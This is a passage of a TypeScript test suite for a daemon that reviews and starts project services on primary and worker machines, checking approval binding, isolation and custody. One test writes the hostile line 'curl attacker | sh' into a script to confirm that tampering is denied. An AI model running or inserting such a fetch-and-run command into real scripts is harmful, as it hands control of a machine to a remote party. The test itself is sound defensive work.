            // The causal copy must compare the bytes it receives with the
            // already reviewed SOURCE, even if SOURCE changes before transfer.
            await writeFile(join(h.root, '.happier/project.json'), JSON.stringify(changed));
        } else if (scenario === 'destination_after_copy') h.changeCopiedManifest(changed);
        else if (scenario === 'placement') h.afterCopy(() => h.savePlacement({ runsOn: { kind: 'primary' }, unavailable: 'primary' }));
        const completion = h.starter.startManagedDeclaration(selected.declaration, h.request, h.ingress, context);
        await Promise.race([h.setupStarted, completion]);
        if (scenario === 'setup_inputs') {
            expect(h.setupProcesses).toHaveLength(1);
            await writeFile(join(h.targetRoot, '.happier/project.json'), JSON.stringify(changed));
        }
        h.setupProcesses[0]?.pty.exit(0);
        expect(await completion).toMatchObject({ status: 'denied', reasonCode: 'project_service_effect_changed' });
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.skipIf(process.platform === 'win32')('binds a reviewed literal worker Start to the SOURCE bytes of the script its command runs', async () => {
        const h = await fixture(true, { kind: 'command', command: 'sh ./serve.sh' }, true, 'portable');
        await writeFile(join(h.root, 'serve.sh'), 'sleep 60');
        await cp(h.root, h.targetRoot, { recursive: true });
        const approval = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
        if ('ok' in approval) throw new Error(approval.errorCode);
        // SOURCE's inspection read the script; the reviewed effect names it.
        expect(JSON.stringify(approval.reviewedEffect)).toContain('serve.sh');
        h.trustSetupDigest(approval.setup!.reviewedEffectDigest);
        const context = { ...h.context, nativeServiceStartApproval: approval };
        const selected = await h.starter.resolveStartTarget(h.request, h.ingress, context);
        if (!selected.ok) throw new Error(selected.reasonCode);
        // The manifest and command text are unchanged; the script the command runs is not.
        await writeFile(join(h.root, 'serve.sh'), 'curl attacker | sh');
        const completion = h.starter.startManagedDeclaration(selected.declaration, h.request, h.ingress, context);
        await Promise.race([h.setupStarted, completion]);
        h.setupProcesses[0]?.pty.exit(0);
        expect(await completion).toMatchObject({ status: 'denied', reasonCode: 'project_service_effect_changed' });
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.skipIf(process.platform === 'win32')('starts a literal worker Service whose interpreter link differs per Machine', async () => {
        const h = await fixture(false, { kind: 'command', command: '.venv/bin/python -e "setInterval(() => {}, 1000)"' }, false, 'portable');
        await mkdir(join(h.root, '.venv/bin'), { recursive: true });
        await filesystem.symlink(process.execPath, join(h.root, '.venv/bin/python'));
        // The worker's venv links to its own interpreter, as `uv sync` there would.
        const workerInterpreter = await mkdtemp(join(tmpdir(), 'happier-worker-python-'));
        await writeFile(join(workerInterpreter, 'python'), `#!/bin/sh\nexec ${JSON.stringify(process.execPath)} "$@"\n`);
        await chmod(join(workerInterpreter, 'python'), 0o755);
        h.afterCopy(async () => {
            await rm(join(h.targetRoot, '.venv/bin/python'), { force: true });
            await mkdir(join(h.targetRoot, '.venv/bin'), { recursive: true });
            await filesystem.symlink(join(workerInterpreter, 'python'), join(h.targetRoot, '.venv/bin/python'));
        });
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected SOURCE effect review');
        const result = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
        try {
            expect(result).toMatchObject({ status: 'succeeded', machineId: 'worker-machine' });
        } finally {
            for (const handle of h.owner.listProjectServices()) await handle.stop();
            await rm(workerInterpreter, { recursive: true, force: true });
        }
    });

    it.skipIf(process.platform === 'win32')('starts a literal worker Service without re-reading its executed files on the worker', async () => {
        const h = await fixture(false, { kind: 'command',
            command: `${JSON.stringify(process.execPath)} -e "setInterval(() => {}, 1000)" || sh locked/fallback.sh` }, false, 'portable');
        // SOURCE has no fallback script; on the worker its folder is unreadable. The worker's
        // effect comes from SOURCE's executed files, so nothing there may read it again.
        h.afterCopy(async () => {
            await mkdir(join(h.targetRoot, 'locked'), { recursive: true });
            await writeFile(join(h.targetRoot, 'locked/fallback.sh'), 'exit 1');
            await chmod(join(h.targetRoot, 'locked'), 0o000);
        });
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected SOURCE effect review');
        try {
            const result = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
            expect(result).toMatchObject({ status: 'succeeded', machineId: 'worker-machine' });
        } finally {
            for (const handle of h.owner.listProjectServices()) await handle.stop();
            await chmod(join(h.targetRoot, 'locked'), 0o755).catch(() => {});
        }
    });

    it('starts an exact Project declaration without waiting for unrelated listener discovery', async () => {
        const h = await fixture();
        await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...h.manifest,
            services: { ...h.manifest.services, sibling: { source: { kind: 'command', command: 'echo sibling' } } } }));
        const review = await h.selectStart();
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        let releaseScan!: () => void;
        const pendingScan = new Promise<void>(resolve => { releaseScan = resolve; });
        let holdScan = false;
        const runtime = createLocalServicesDaemonRuntime({ machineId: h.workspace.machineId,
            startLoop: false, inventoryEnabled: () => true, projectManagedServices: h.owner,
            workspaceFacts: () => ({ facts: [{ id: h.workspace.id, path: h.root }], acceptedWorkspaceRefs: [h.workspace], diagnostics: [] }),
            scan: async () => { if (holdScan) await pendingScan; return { listeners: [], processes: new Map(), workspaces: [], diagnostics: [] }; },
            projectServiceStarter: { resolveRuntime: async () => h.runtime,
                acquirePluginRuntime: async () => ({ registry: { projectManagedServices: h.owner,
                    retirementSignal: new AbortController().signal }, release: async () => {} }) } });
        // Exact Start preserves admitted discovery; it does not discover previously unread siblings.
        expect((await runtime.launcherRoutes.getSnapshot({ workspaceRoot: h.root })).targets)
            .toEqual(expect.arrayContaining([expect.objectContaining({ declaration: expect.objectContaining({
                selection: { kind: 'manifest', name: 'sibling' },
            }) })]));
        holdScan = true;
        const inventory = runtime.refreshInventoryNow();
        let receiptSettled = false;
        const completion = (async () => {
            const started = await runtime.launcherRoutes.startTarget!({ ...h.request,
                expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
            expect(started).toMatchObject({ status: 'succeeded', currentTarget: { machineId: h.workspace.machineId },
                snapshot: { targets: expect.arrayContaining([
                    expect.objectContaining({ source: 'managed_service', serviceState: 'running' }),
                    expect.objectContaining({ declaration: expect.objectContaining({ selection: { kind: 'manifest', name: 'sibling' } }) }),
                ]) } });
            receiptSettled = true;
            return started;
        })();
        void completion.catch(() => {});
        try {
            await vi.waitFor(() => expect(h.owner.listProjectServices().some(handle => handle.snapshot().state === 'running')).toBe(true));
            // Native readiness and the complete Start receipt must not wait for an unrelated Machine scan.
            await vi.waitFor(() => expect(receiptSettled).toBe(true));
            releaseScan();
            await completion;
            const denied = await runtime.launcherRoutes.startTarget!({ ...h.request, expectedEffectDigest: 'changed' }, h.ingress, h.context);
            expect(denied).toMatchObject({ status: 'denied', snapshot: { targets: expect.arrayContaining([
                expect.objectContaining({ declaration: expect.objectContaining({ selection: { kind: 'manifest', name: 'sibling' } }) }),
            ]) } });
        } finally { releaseScan(); await inventory; try { await completion; } finally { await runtime.stop(); } }
    });
    it('reads placement while SOURCE inspection is pending and retains the primary-only refusal', async () => {
        const h = await fixture(false, undefined, true, 'primary');
        let releaseInspection!: () => void;
        const pendingInspection = new Promise<void>(resolve => { releaseInspection = resolve; });
        let inspectionStarted = false;
        const post = vi.mocked(axios.post).getMockImplementation()!;
        vi.mocked(axios.post).mockImplementation(async (url, body, options) => {
            if (new URL(String(url)).pathname === '/v1/actions/projects.inspect') {
                inspectionStarted = true;
                await pendingInspection;
            }
            return post(url, body, options);
        });
        const review = h.starter.resolveStartTarget(h.request, h.ingress, h.context);
        try {
            await vi.waitFor(() => expect(inspectionStarted).toBe(true));
            await vi.waitFor(() => expect(h.placementReads()).toBeGreaterThan(0));
        } finally { releaseInspection(); }
        expect(await review).toMatchObject({ ok: false, reasonCode: 'primary_only' });
        expect(h.copies()).toBe(0);
        expect(h.owner.listProjectServices()).toEqual([]);
    });
    it.each(['revoked', 'cancelled'] as const)('avoids finite-policy IO and never reviews a Service after %s admission', async scenario => {
        const h = await fixture(false, undefined, false, 'portable');
        const api = await ApiClient.create(h.runtime.credentials);
        let policyRead = false;
        let admissionRead = false;
        let releaseAdmission!: (current: boolean) => void;
        const pendingAdmission = new Promise<boolean>(resolve => { releaseAdmission = resolve; });
        const transport = new AbortController();
        const read = vi.mocked(axios.get).getMockImplementation()!;
        vi.mocked(axios.get).mockImplementation(async (url, options) => {
            if (new URL(String(url)).pathname === `/v1/machines/${h.targetWorkspace.machineId}`) policyRead = true;
            return read(url, options);
        });
        const policy = createMachineFinitePolicyClient({ machineId: h.targetWorkspace.machineId,
            readMachine: () => api.getMachine(h.targetWorkspace.machineId),
            updateMetadata: async () => { throw new Error('Service review must not write finite policy'); } });
        Object.assign(h.runtime, { workerAdmission: createProjectWorkerAdmission({ machineId: h.targetWorkspace.machineId,
            admissionDrain: h.admissionDrain, readPolicy: () => policy.get() }) });
        const review = h.starter.resolveStartTarget(h.request, { ...h.ingress, signal: transport.signal,
            verifyMachineAdmissionCurrent: async () => { admissionRead = true; return pendingAdmission; } }, h.context);
        try {
            await vi.waitFor(() => expect(admissionRead).toBe(true));
            // Service acceptance needs live drain/memory, not finite load.
            // SOURCE inspection, copy and effects still wait for authority.
            expect(policyRead).toBe(false);
            expect(h.post.mock.calls.some(([url]) => String(url).endsWith('/v1/actions/projects.inspect'))).toBe(false);
        } finally {
            if (scenario === 'cancelled') transport.abort();
            releaseAdmission(scenario === 'cancelled');
            const result = await review;
            expect(result).toMatchObject({ ok: false, reasonCode: scenario === 'revoked' ? 'machine_admission_changed' : 'cancelled' });
            expect(h.copies()).toBe(0);
            expect(h.owner.listProjectServices()).toEqual([]);
        }
    });

    const cleanups: Array<() => Promise<void>> = [];
    afterEach(async () => { vi.restoreAllMocks(); withdrawActiveProjectAccountRowsSnapshot(); await Promise.all(cleanups.splice(0).map(cleanup => cleanup())); });

    /** A Project checkout inside a Separate-users requester's own member workspace. Before
     * `separate()` the daemon may read it; afterwards only its member user can traverse it. */
    async function separateUsersFixture(setup = false, memberCustody = true) {
        const boundary = workspaceCheckoutNativeBoundary;
        cleanups.push(async () => { boundary.reset(); });
        const requesterIdentity = { kind: 'isolated' as const, separationRequired: true,
            requester: { serverId: 'home', accountId: 'owner', machineId: 'machine', installationId: 'installation' } };
        const memberIdentity = { ...deriveAgentIsolationMemberIdentity({ ...requesterIdentity, homeServerIdentityId: 'home' }), agentUid: 2401, agentGid: 2401 };
        const backing = await mkdtemp(join(tmpdir(), 'happier-project-service-member-'));
        cleanups.push(() => rm(backing, { recursive: true, force: true }));
        boundary.mounts = [{ path: memberIdentity.workspaceRoot, backing, uid: 2401, gid: 2400, mode: 0o40710 }];
        const root = join(memberIdentity.workspaceRoot, 'accepted');
        const inside = (path: unknown) => String(path) === root || String(path).startsWith(`${root}/`);
        let separated = false;
        const realpath = filesystemBoundary.realpathSync;
        vi.spyOn(filesystemBoundary, 'realpathSync').mockImplementation(((path: Parameters<typeof realpath>[0], options?: Parameters<typeof realpath>[1]) => {
            if (!inside(path)) return realpath(path, options);
            if (separated && boundary.identity.getStore() !== 'member') {
                boundary.phases.push('daemon_private_readback_denied');
                throw Object.assign(new Error('Daemon cannot traverse the member checkout'), { code: 'EACCES' });
            }
            realpath(`${backing}${String(path).slice(memberIdentity.workspaceRoot.length)}`, options);
            return String(path);
        }) as typeof realpath);
        const h = await fixture(setup, undefined, true, undefined, 'home', 'home', undefined, undefined, false, false, false, root);
        const snapshot = { enabled: true, memberProvisioning: 'linuxUsersV1' as const,
            status: { kind: 'effective' as const, platform: 'linux' as const }, workspaceRoots: [] };
        const separate = () => {
            separated = true;
            boundary.privateRoots = [root];
            boundary.launch = async (input, output) => {
                const frame = await readAgentLaunchFrame(input);
                expect(frame.nativeIdentity?.agentUid).toBe(2401);
                await runWorkspaceEffectWorker([], { input, output, signal: new AbortController().signal, currentDirectory: () => memberIdentity.workspaceRoot });
            };
            Object.assign(h.runtime, { requesterIdentity, agentIsolation: { read: () => snapshot },
                ...(memberCustody ? { nativeOperationRuntime: { prepareNativeOperation: (input: Parameters<typeof prepareRequesterNativeOperation>[0]) =>
                    prepareRequesterNativeOperation(input, { homeServerIdentityId: 'home', machineId: 'machine', installationId: 'installation',
                        machine: { read: () => snapshot, managedHappierBinaryPath: '/opt/happier/cli/current/happier',
                            readMember: async () => ({ identity: memberIdentity, daemonObservation: {
                                daemonIdentity: 'nonRoot', daemonUid: 2400, daemonUsername: 'daemon', daemonPrimaryGroup: 'daemon' } }) } }) } } : {}) });
            return boundary;
        };
        return { h, separate };
    }

    it.skipIf(process.platform !== 'linux')('reviews a Separate-users private checkout as its member user and keeps cross-Account refusal', async () => {
        const { h, separate } = await separateUsersFixture();
        const owner = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
        if (!('reviewedEffectDigest' in owner)) throw new Error(`Expected the daemon-readable review: ${JSON.stringify(owner)}`);
        const boundary = separate();
        expect(await h.starter.prepareStartApproval(h.request,
            { ...h.ingress, machineAdmission: { ...h.ingress.machineAdmission!, actorAccountId: 'another-account' } }, h.context))
            .toMatchObject({ ok: false, errorCode: 'project_requester_credentials_unavailable' });
        expect(boundary.phases).toEqual([]);
        expect(await h.starter.prepareStartApproval(h.request, h.ingress, h.context))
            .toMatchObject({ reviewedEffectDigest: owner.reviewedEffectDigest });
        expect(boundary.phases).toContain('native_spawn');
        expect(boundary.phases).not.toContain('daemon_private_readback_denied');
        expect(boundary.childFailure).toBeUndefined();
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.skipIf(process.platform !== 'linux')('refuses a Separate-users Start without member execution custody before setup or launch', async () => {
        const { h, separate } = await separateUsersFixture(true, false);
        const boundary = separate();
        expect(await h.starter.prepareStartApproval(h.request, h.ingress, h.context))
            .toMatchObject({ ok: false, errorCode: 'agent_isolation_unavailable' });
        expect(await h.starter.resolveStartTarget(h.request, h.ingress, h.context))
            .toMatchObject({ ok: false, reasonCode: 'agent_isolation_unavailable' });
        expect(boundary.phases).not.toContain('daemon_private_readback_denied');
        expect(h.setupProcesses).toEqual([]);
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.each([false, true])('prepares native Service approval custody without copying or launching (setup=%s)', async setup => {
        const h = await fixture(setup);
        const reviewed = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
        expect(reviewed).toMatchObject({ request: h.request, target: { machineId: h.targetWorkspace.machineId,
            rootPath: h.targetRoot }, reviewedEffectDigest: expect.any(String) });
        if (setup) expect(reviewed).toMatchObject({ setup: { project: { projectId: 'project' },
            reviewedEffectDigest: expect.any(String), reviewedEffect: { commands: expect.any(Array) } } });
        expect(h.copies()).toBe(0);
        expect(h.setupProcesses).toEqual([]);
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it('prepares worker approval using admitted requester custody for the SOURCE Machine read', async () => {
        const h = await fixture(false, undefined, true, 'portable');
        await cp(h.root, h.targetRoot, { recursive: true });
        const channel = await createRequesterCurrentnessSocketHarness();
        cleanups.push(() => channel.close());
        const read = vi.mocked(axios.get).getMockImplementation()!;
        vi.mocked(axios.get).mockImplementation(async (url, options) => {
            const path = new URL(String(url)).pathname;
            if (path === '/v1/account/profile') return { status: 200, data: { id: 'owner' } };
            if (path === '/v1/account/encryption/currentness') return { status: 200, data: {
                mode: 'plain', version: 1, signingKeyFingerprint: null, contentKeyFingerprint: null, updatedAt: 1 } };
            // Home admits SOURCE content under the captured requester, not the
            // signed native-effect root whose Machine is the destination worker.
            if (path === `/v1/machines/${h.workspace.machineId}`
                && options?.headers?.Authorization !== `Bearer ${h.runtime.credentials!.token}`) {
                throw new Error('Worker-bound effect cannot read SOURCE Machine content');
            }
            return read(url, options);
        });
        const authorization = ExternalActionExecutionAuthorizationV1Schema.parse({ v: 1, token: 'worker-start-root', binding: {
            accountId: 'owner', custodianAccountId: 'owner', authentication: { kind: 'terminal', tokenEpoch: 1 },
            accountEncryptionMode: 'plain', serverIdentityId: h.serverIdentityId, machineId: h.targetWorkspace.machineId,
            installationId: 'installation', actionId: 'localServices.launcher.start', requestId: 'service-request',
            requestEnvelopeDigest: 'a'.repeat(43), target: { kind: 'machine', machineId: h.targetWorkspace.machineId },
        } });
        const admitted = await admitRequesterAccountActionContext({ authorization, credentials: h.runtime.credentials!,
            serverId: 'home', serverIdentityId: h.serverIdentityId, serverHttpBaseUrl: 'https://home.example',
            isCurrent: async () => true, isCustodyCurrent: async () => true });
        if (!admitted) throw new Error('Worker requester custody was not admitted');
        cleanups.push(() => admitted.dispose());
        const carrier = await projectExternalActionRequesterHttpAuthorization({ authorization: admitted.authorization,
            serverId: 'home', serverIdentityId: h.serverIdentityId, serverHttpBaseUrl: 'https://home.example',
            target: authorization.binding.target, installationId: 'installation', privateKey: nacl.sign.keyPair().secretKey });
        if (!carrier) throw new Error('Worker requester HTTP projection was not admitted');
        const api = await ApiClient.create(h.runtime.credentials!);
        Object.assign(h.runtime, { inspectSourceProjectManifest: createProjectFiniteSourceManifestInspector({
            api: { getMachine: (machineId, options) => api.getMachine(machineId, { ...options, authorization: carrier }) },
            credentials: h.runtime.credentials!, serverId: 'home', serverHttpBaseUrl: 'https://home.example',
            accountId: 'owner', ingress: { ...h.ingress, callerInputAuthorization: carrier },
        }) });
        const reviewed = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
        expect(reviewed).toMatchObject({ request: h.request, target: { machineId: h.targetWorkspace.machineId,
            rootPath: h.targetRoot }, reviewedEffectDigest: expect.any(String) });
        expect(h.copies()).toBe(0);
        expect(h.setupProcesses).toEqual([]);
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.each([false, true, 'already observed'] as const)('retains admitted Start custody on browser disconnect and later authority loss (revoked=%s)', async variant => {
        const revoked = variant === true;
        const alreadyObserved = variant === 'already observed';
        const h = await fixture(false, undefined, true, 'portable');
        const boundaryFailures: unknown[] = [];
        const post = h.post.getMockImplementation()!;
        h.post.mockImplementation(async (url, body, options) => {
            try { return await post(url, body, options); }
            catch (error) { boundaryFailures.push(error); throw error; }
        });
        let releaseCopy!: () => void;
        const copying = new Promise<void>(resolve => { releaseCopy = resolve; });
        let observeCopy!: () => void;
        const copyStarted = new Promise<void>(resolve => { observeCopy = resolve; });
        h.afterCopy(() => { observeCopy(); return copying; });
        const review = await h.selectStart();
        expect(boundaryFailures).toEqual([]);
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        if (!review.reviewedEffectDigest) throw new Error('Expected service review');
        const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
        const transport = new AbortController();
        const ingress = { ...h.ingress, signal: transport.signal,
            verifyMachineAdmissionCurrent: async () => !transport.signal.aborted };
        const completion = alreadyObserved ? h.operationRuntime.observeExecution({ actionId: 'localServices.launcher.start', input: request,
            actionRequestId: 'already-observed-service-start', rpcContext: ingress,
            execute: async owned => ({ ok: true, result: await h.routes.startTarget!(request, ingress, { ...h.context, ...owned }) }),
        }) : h.operationRuntime.runActionOperation({ actionId: 'localServices.launcher.start', input: request,
            context: { ...h.context, signal: transport.signal },
            execute: async context => ({ ok: true, result: await h.routes.startTarget!(request, ingress, context) }) });
        const scope = { accountId: 'owner', machineId: h.targetWorkspace.machineId };
        try {
            if (alreadyObserved) await vi.waitFor(() => expect(h.copies()).toBe(1));
            await Promise.race([copyStarted, completion.then(result => {
                throw new Error('Service Start settled before its copy phase: ' + JSON.stringify(result));
            })]);
            expect(h.copies()).toBe(1);
            const start = h.operationRuntime.store.list(scope).items.find(item => item.actionId === 'localServices.launcher.start');
            expect(start).toMatchObject({ state: 'running', progress: { phase: 'copying' },
                domainRef: { kind: 'projectService', purpose: 'start', sourceWorkspace: { serverId: 'home', refId: h.workspace.id },
                    workspace: { machineId: h.targetWorkspace.machineId, workspaceId: h.targetWorkspace.id, rootPath: h.targetRoot },
                    declaration: { ...h.request.declaration, workspaceRefId: h.targetWorkspace.id } } });
            expect(ActionOperationSnapshotV1Schema.safeParse(start).success).toBe(true);
            const pending = DaemonLocalServiceLauncherSnapshotResponseV1Schema.parse({ protocolVersion: 1,
                snapshot: await h.routes.getSnapshot({ scope: 'machine', discovery: 'cached' }) }).snapshot;
            expect(pending.targets).toEqual([expect.objectContaining({ machineId: h.targetWorkspace.machineId,
                workspaceId: h.targetWorkspace.id, cwd: h.targetRoot, serviceState: 'starting', state: 'starting' })]);
            expect(buildLocalServiceRows({ inventoryRows: [], launchTargets: pending.targets, sessionId: null, scope: 'workspace' }))
                .toEqual([expect.objectContaining({ status: 'starting' })]);
            expect((await h.routes.getSnapshot({ workspaceRoot: h.root, discovery: 'cached' })).targets).toEqual([]);
            transport.abort();
            releaseCopy();
            expect(await completion).toMatchObject({ ok: true, result: { status: 'succeeded' } });
            expect(h.operationRuntime.store.list(scope).items.find(item => item.operationId === start!.operationId)).toMatchObject({ state: 'succeeded',
                progress: { phase: 'starting' }, domainRef: { currentTarget: { managedServiceId: expect.any(String),
                    machineId: h.targetWorkspace.machineId, workspaceId: h.targetWorkspace.id } } });
            expect(h.operationSnapshots.some(item => item.actionId === 'localServices.launcher.start'
                && item.progress?.kind === 'phase' && item.progress.phase === 'preparing')).toBe(true);
            expect(h.operationSnapshots.filter(item => item.actionId === 'localServices.launcher.start')
                .every(item => ActionOperationSnapshotV1Schema.safeParse(item).success)).toBe(true);
            expect(h.operationSnapshots.filter(item => item.actionId === 'localServices.launcher.start')
                .every(item => PredecessorOperationSchema.safeParse(projectActionOperationSnapshotForV1Reader(item)).success)).toBe(true);
            expect(new Set(h.operationSnapshots.filter(item => item.actionId === 'localServices.launcher.start').map(item => item.operationId)).size).toBe(1);
        } finally {
            releaseCopy(); h.setupProcesses.forEach(process => process.pty.exit(0));
            // A self-join starts no native work and owns no process to retire.
            if (!alreadyObserved || h.copies() > 0) await completion;
        }
    });

    it.each([false, true])('binds Auto Service approval to the native worker before publication (withdrawn=%s)', async withdrawn => {
        const h = await fixture(false, undefined, false, 'portable');
        await cp(h.root, h.targetRoot, { recursive: true });
        const poolId = '99d55938-f860-4af8-8023-01fecec86f35';
        let connected = true;
        vi.spyOn(axios, 'request').mockImplementation(async config => {
            if (config.url === 'https://home.example/v1/account/encryption') return { status: 200, data: { mode: 'plain', updatedAt: 1 } };
            expect(config.url).toBe('https://home.example/v1/machines/pools/get');
            const view: MachinePoolPrivateViewV1 = { pool: { id: poolId, name: { kind: 'available', label: { content: { t: 'plain', v: 'Workers' }, recipientEnvelope: null } }, description: null, revision: 1,
                createdAt: 1, updatedAt: 1, members: connected ? [{ machineId: h.targetWorkspace.machineId,
                    priorityTier: 0, enabled: true, state: 'connected' }] : [] },
                availability: { state: 'known', connectedCount: connected ? 1 : 0, enabledCount: connected ? 1 : 0 } };
            return { status: 200, data: view };
        });
        const request = { ...h.request, choice: { kind: 'workers' as const,
            destination: { kind: 'pool' as const, poolId, selection: 'automatic' as const } } };
        h.savePlacement({ runsOn: request.choice, unavailable: 'fail' });
        let artifact: ReturnType<typeof ApprovalRequestV2Schema.parse> | undefined;
        const executor = createActionExecutor({ ...createCliActionDeps({ token: h.runtime.credentials!.token,
            credentials: h.runtime.credentials!, serverId: 'home', serverHttpBaseUrl: 'https://home.example',
            sessionId: '', mode: 'plain', ctx: null }),
            machinePoolAction: createAccountServerActionDeps({ token: h.runtime.credentials!.token,
                credentials: h.runtime.credentials!, serverId: 'home', serverHttpBaseUrl: 'https://home.example' }).machinePoolAction,
            prepareLocalServiceStartApproval: ({ input, context, executeCanonicalAction }) =>
                h.starter.prepareStartApproval(input, h.ingress, context, executeCanonicalAction),
            runtimeActionExecute: await h.createRuntimeActionExecutor(),
            // Artifact storage is the system boundary; native and approval owners stay real.
            approvalsCreate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request); return { artifactId: 'auto-service' }; },
            approvalsGet: async () => artifact ?? null,
            approvalsUpdate: async ({ request }) => { artifact = ApprovalRequestV2Schema.parse(request); return { ok: true }; },
            isApprovalExecutionOriginCurrent: async () => true,
        });
        const context = { surface: 'cli' as const, authority: 'present_user' as const, serverId: 'home',
            runtimeAccountId: 'owner', actionRequestId: 'auto-service-review' };
        const proposal = await executor.execute('localServices.launcher.start', request, context);
        expect(proposal, JSON.stringify(proposal)).toMatchObject({ ok: true,
            result: { kind: 'approval_request_created' } });
        expect(artifact).toMatchObject({ actionArgs: request, preview: { serviceStartReview: { request,
            target: { machineId: h.targetWorkspace.machineId, rootPath: h.targetRoot } } } });
        expect(h.copies()).toBe(0);
        expect(h.owner.listProjectServices()).toEqual([]);
        connected = !withdrawn;
        expect(await executor.execute('approval.request.decide', { artifactId: 'auto-service', decision: 'approve' }, context))
            .toMatchObject({ ok: true });
        // Receiving placement refusal is an Action failure before native Start,
        // not a successful Action carrying the starter's domain denial.
        expect(artifact?.execution, JSON.stringify(artifact?.execution)).toMatchObject(withdrawn
            ? { ok: false, errorCode: 'target_not_local' } : { ok: true, result: { status: 'succeeded' } });
        expect(h.copies()).toBe(withdrawn ? 0 : 1);
        expect(h.owner.listProjectServices()).toHaveLength(withdrawn ? 0 : 1);
        await h.owner.listProjectServices()[0]?.stop();
    });

    it('refuses native worker approval without target review bytes before any copy', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'package_script', file: 'package.json', target: 'dev' }, true, 'portable');
        await writeFile(join(h.root, 'package.json'), JSON.stringify({ scripts: { dev: 'serve web' } }));
        const reviewed = await h.starter.prepareStartApproval(h.request, h.ingress, h.context);
        expect(reviewed).toMatchObject({ ok: false, errorCode: 'project_service_effect_changed' });
        expect(h.copies()).toBe(0);
        expect(h.setupProcesses).toEqual([]);
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it('preserves native process uncertainty during approval review instead of publishing a settled refusal', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'compose', file: 'compose.yaml', target: 'worker' });
        await writeFile(join(h.root, 'compose.yaml'), 'services:\n  worker:\n    image: alpine:3.22\n');
        h.setNativeTool({ executablePath: '/installed/docker' });
        const uncertain = Object.assign(new Error('Native tool process termination is unconfirmed'), { code: 'plugin_exec_termination_incomplete' });
        // Docker probe execution is native process IO; review and custody remain real.
        Object.assign(h.runtime, { environmentIo: { ...h.runtime.environmentIo, run: async () => { throw uncertain; } } });
        await expect(h.starter.prepareStartApproval(h.request, h.ingress, h.context)).rejects.toBe(uncertain);
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    function serviceWorkerAction(f: Awaited<ReturnType<typeof fixture>>, machineId: string) {
        return createProjectWorkerAction({ machineId, serverId: 'home', serverHttpBaseUrl: 'https://home.example',
            credentials: f.runtime.credentials!, accountId: 'owner',
            admission: createProjectWorkerAdmission({ machineId, admissionDrain: createDaemonAdmissionDrain(),
                readPolicy: async () => ({ status: 'ready', policy: { accepting: true, runAtMost: null }, source: 'stored', metadataVersion: 1 }) }),
            isFiniteExecutionLive: () => false, isServiceExecutionLive: () => true });
    }

    async function fixture(setup = false, source?: unknown, finiteAccepting = true, workerExecution?: 'portable' | 'primary', profileId = 'home', homeId = profileId, supervisorPlatform?: NodeJS.Platform,
        toolchain?: import('@happier-dev/protocol/workspaces/projectSetup/projectManifestV1').ProjectToolchainSelectionV1, acceptedSharedSetup = false, interactive = false, retained = false, memberRoot?: string) {
        const root = memberRoot ?? await mkdtemp(join(tmpdir(), 'happier-project-service-'));
        await mkdir(join(root, '.happier'), { recursive: true });
        const command = `${JSON.stringify(process.execPath)} -e "setInterval(() => {}, 1000)"`;
        const manifest = ProjectManifestV1Schema.parse({ version: 1, services: { worker: { source: source ?? { kind: 'command', command },
            ...(interactive ? { runtime: { terminal: true } } : {}),
            ...(workerExecution ? { execution: workerExecution } : {}) } },
            ...(setup ? { workspace: { setup: [{ kind: 'command', command: 'echo setup' }] } } : {}), ...(toolchain ? { toolchain } : {}) });
        if (!acceptedSharedSetup) await writeFile(join(root, '.happier/project.json'), JSON.stringify(manifest));
        const setupSelection = { sourceId: 'published-service-source', contentRevision: { headerVersion: 1, bodyVersion: 1 },
            digest: projectSharedSetupDigestV1(manifest) };
        const workspace = { id: 'accepted', serverId: homeId, machineId: 'machine', rootPath: root, createdAtMs: 1, projectKey: 'project' };
        const targetRoot = workerExecution ? await mkdtemp(join(tmpdir(), 'happier-project-service-target-')) : root;
        const targetWorkspace = workerExecution ? { ...workspace, id: 'worker-ref', machineId: 'worker-machine', rootPath: targetRoot } : workspace;
        const credentials = { token: `header.${Buffer.from(JSON.stringify({ sub: 'owner', tokenEpoch: 1,
            provenance: { v: 1, kind: 'terminal', authority: 'account_automation' } })).toString('base64url')}.signature`, encryption: null,
            credentialProvenance: 'stored_session' as const };
        if (workerExecution) {
            const channel = await createRequesterCurrentnessSocketHarness();
            cleanups.push(() => channel.close());
        }
        const serverIdentityId = homeId.startsWith('srv_') ? homeId : 'srv_serviceHome';
        const serverUrl = 'https://home.example';
        // The installed host has admitted an exact saved Home. A local alias
        // alone is no longer an identity for original-Account SOURCE admission.
        await updateSettings(settings => ({ ...settings, activeServerId: profileId, servers: {
            [profileId]: { id: profileId, name: 'Service', serverUrl, webappUrl: serverUrl,
                createdAt: 1, updatedAt: 1, lastUsedAt: 1, homeConnectionDescriptorAuthority: 'exact' as const,
                homeConnectionDescriptor: HomeConnectionDescriptorV1Schema.parse({ v: 1,
                    homeServerIdentityId: serverIdentityId, canonicalServerUrl: serverUrl, revision: 1,
                    endpoints: [{ kind: 'https', url: serverUrl }] }) },
        } }));
        const machineInstallationKeys = new Map<string, Uint8Array>();
        const machines = [workspace, ...(workerExecution ? [targetWorkspace] : [])].map(value => {
            const installationId = value.machineId === workspace.machineId ? 'source-installation' : 'installation';
            const machine = ExternalActionMachineBootstrapV1Schema.parse({
                id: value.machineId, installationId,
